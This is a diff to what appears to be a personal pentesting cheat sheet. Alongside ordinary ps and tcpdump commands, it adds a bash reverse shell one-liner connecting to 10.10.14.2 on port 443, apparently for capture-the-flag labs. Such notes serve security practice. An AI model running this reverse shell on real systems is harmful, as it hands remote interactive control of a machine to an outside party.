@@ -446,5 +446,7 @@ ps -ef | grep username #See what users are executing
 Get HTTP and HTTPS traffic on selected interface:
 tcpdump -i ens19 -nl port http or port https
 
+bash reverse shell that works for ippsec so it works for me :)
+bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'
 
 
